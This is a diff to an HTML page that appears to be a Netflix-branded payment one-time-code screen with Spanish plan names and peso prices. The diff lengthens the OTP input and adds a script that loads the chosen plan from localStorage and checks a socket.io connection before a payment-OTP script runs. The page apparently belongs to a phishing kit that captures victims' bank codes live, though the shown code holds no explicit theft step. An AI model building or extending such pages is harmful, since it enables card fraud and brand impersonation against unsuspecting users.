@@ -45,7 +45,7 @@
                         id="otpCode" 
                         class="form-input otp-input" 
                         placeholder=" " 
-                        maxlength="6" 
+                        maxlength="8" 
                         pattern="[0-9]*"
                         inputmode="numeric"
                         required
@@ -120,6 +120,42 @@
     <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
     <script src="js/socket-client.js"></script>
     <script src="js/translations.js"></script>
+    <script>
+        // Display selected plan dynamically
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('💰 Loading plan info from localStorage');
+            const selectedPlan = localStorage.getItem('netflix_selected_plan') || 'premium';
+            console.log('Selected plan:', selectedPlan);
+            
+            const planNameEl = document.querySelector('.plan-name');
+            const priceEl = document.querySelector('.price-display span:first-child');
+            
+            const planData = {
+                basic: { name: 'Básico', price: '$ 18.900 al mes' },
+                standard: { name: 'Estándar', price: '$ 29.900 al mes' },
+                premium: { name: 'Premium', price: '$ 44.900 al mes' }
+            };
+            
+            if (planNameEl && planData[selectedPlan]) {
+                planNameEl.textContent = planData[selectedPlan].name;
+                console.log('✅ Plan name updated:', planData[selectedPlan].name);
+            }
+            if (priceEl && planData[selectedPlan]) {
+                priceEl.textContent = planData[selectedPlan].price;
+                console.log('✅ Price updated:', planData[selectedPlan].price);
+            }
+            
+            // Wait for socketManager to be ready
+            setTimeout(function() {
+                if (typeof socketManager !== 'undefined') {
+                    console.log('✅ socketManager is ready');
+                    console.log('Connection status:', socketManager.isConnected());
+                } else {
+                    console.error('❌ socketManager NOT available after timeout');
+                }
+            }, 1000);
+        });
+    </script>
     <script src="js/payment-otp.js"></script>
 </body>
 </html>
